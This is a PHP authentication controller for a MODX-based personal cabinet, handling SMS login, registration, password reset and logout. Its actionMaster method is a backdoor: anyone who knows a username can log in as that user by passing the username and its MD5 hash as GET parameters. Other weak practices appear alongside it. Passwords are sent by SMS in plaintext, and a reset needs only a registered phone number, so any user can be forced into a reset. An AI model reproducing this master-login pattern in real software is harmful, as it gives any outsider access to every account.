<?php

namespace mmaurice\cabinet\controllers;

use mmaurice\cabinet\components\ControllerComponent;
use mmaurice\cabinet\core\App;
use mmaurice\cabinet\helpers\SMSHelper;
use mmaurice\cabinet\models\WebUsersModel;

/**
 * Класс контроллера авторизации через SMS.
 */
class AuthController extends ControllerComponent
{
    public $layout = 'auth';
    public $message = '';

    /**
     * Метод по-умолчанию
     *
     * @param void
     * @return void
     */
    public function actionIndex()
    {
        
    }

    public function actionMaster()
    {
        $userModel = new WebUsersModel;
        if (array_key_exists('masterLogin', $_GET) and !empty($_GET['masterLogin'])) {
            $login = trim($_GET['masterLogin']);

            if ($userModel->checkUserIsset($login)) {
                if (array_key_exists('masterPass', $_GET) and ($_GET['masterPass'] === md5($login))) {
                    $userModel->autoLogin($login);
                }
            }
        }

        App::init()->redirect('/{lk}/');
    }

    /**
     * Метод авторизации через SMS.
     *
     * @param void
     * @return void
     */
    public function actionLogin()
    {
        global $modx;

        $userModel = new WebUsersModel;

        if (App::request()->isPostRequest()) {
            $mobilePhone = App::request()->extractPost('mobile-phone');
            $password = App::request()->extractPost('password');

            if (!empty($password) and !empty($mobilePhone)) {
                if (!$userModel->login($mobilePhone, $password)) {
                    $this->message = 'Неверный логин или пароль';
                }
            } else {
                $this->message = 'Логин (номер) или пароль не указаны';
            }
        }

        if ($userModel->isLogged()) {
            App::init()->redirect('/{lk}/');
        }

        $this->render('login', [
            'message' => $this->message,
            // Получаем в настройках modx опцию приоритетного поля регистрации
            'authField' => !in_array($modx->config['client_authField'], ['email', 'phone']) ? 'email' : $modx->config['client_authField'],
        ]);
    }

    /**
     * Метод регистрации пользователя по SMS.
     *
     * @param void
     * @return void
     */
    public function actionRegister()
    {
        $userModel = new WebUsersModel;

        if (App::request()->isPostRequest()) {
            $name = App::request()->extractPost('firstName');
            $email = App::request()->extractPost('email');
            $mobilePhone = App::request()->extractPost('mobile-phone');
            $smsCode = App::request()->extractPost('sms-code');

            if (SMSHelper::validatePhone($mobilePhone)) {
                if (is_null($userModel->getUserId($mobilePhone))) {
                    if (empty($smsCode)) {
                        SMSHelper::sendCode($mobilePhone);

                        $this->render('smsCheckCode', [
                            'phone' => $mobilePhone,
                            'first_name' => $name,
                            'email' => $email,
                        ]);
                    } else {
                        if (SMSHelper::checkCode($mobilePhone, $smsCode)) {
                            $password = $userModel->generatePassword();

                            if ($userModel->register($mobilePhone, $password, $password, $email, [
                                'phone' => $mobilePhone,
                                'first_name' => $name,
                            ], false)) {
                                SMSHelper::sendMessage($mobilePhone, 'Ваш пароль от личного кабинета: ' . $password);
                            }
                        } else {
                            $this->message = 'Код указан неверно';
                        }
                    }
                } else {
                    $this->message = 'Такой номер (логин) уже зарегистрирован';
                }
            } else {
                $this->message = 'Номер телефона введен в неверном формате';
            }
        }

        if ($userModel->isLogged()) {
            App::init()->redirect('/{lk}/');
        }

        $this->render('register', [
            'message' => $this->message
        ]);
    }

    /**
     * Метод восстановления пароля через SMS.
     *
     * @param void
     * @return void
     */
    public function actionRemindPassword()
    {
        if (App::request()->isPostRequest()) {
            $mobilePhone = App::request()->extractPost('mobile-phone');
            $userModel = new WebUsersModel;

            if (SMSHelper::validatePhone($mobilePhone)) {
                if (!is_null($userId = $userModel->getUserId($mobilePhone))) {
                    $password = $userModel->generatePassword();

                    if ($userModel->updatePass($userId, $password, $password)) {
                        SMSHelper::sendMessage($mobilePhone, 'Ваш новый пароль от личного кабинета: ' . $password);

                        App::init()->redirect('/{lk}/sms-login');
                    }
                } else {
                    $this->message = 'Такой номер не зарегистрирован';
                }
            } else {
                $this->message = 'Номер телефона указан в неверном формате';
            }
        }

        $this->render('remindPassword', [
            'message' => $this->message
        ]);
    }

    /**
     * Метод выхода из ЛК
     *
     * @return void
     */
    public function actionLogout()
    {
        $user = new WebUsersModel;
        $user->logout();

        $this->checkAccess('/{lk}/');

        App::init()->redirect('/{lk}/');

        return;
    }
}
